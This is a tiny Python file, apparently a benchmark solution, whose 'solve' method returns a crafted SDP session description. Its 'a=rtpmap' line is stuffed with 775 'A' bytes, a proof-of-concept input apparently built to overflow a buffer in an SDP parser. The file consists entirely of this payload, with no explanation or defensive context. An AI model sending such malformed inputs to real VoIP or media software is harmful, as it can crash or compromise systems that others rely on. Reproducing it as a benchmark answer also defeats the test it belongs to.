class Solution:
    def solve(self, src_path: str) -> bytes:
        return b"v=0\no=- 0 0 IN IP4 127.0.0.1\ns=-\nc=IN IP4 127.0.0.1\nt=0 0\nm=audio 5004 RTP/AVP 0\na=rtpmap:0 " + b"A" * 775 + b"/8000\n"
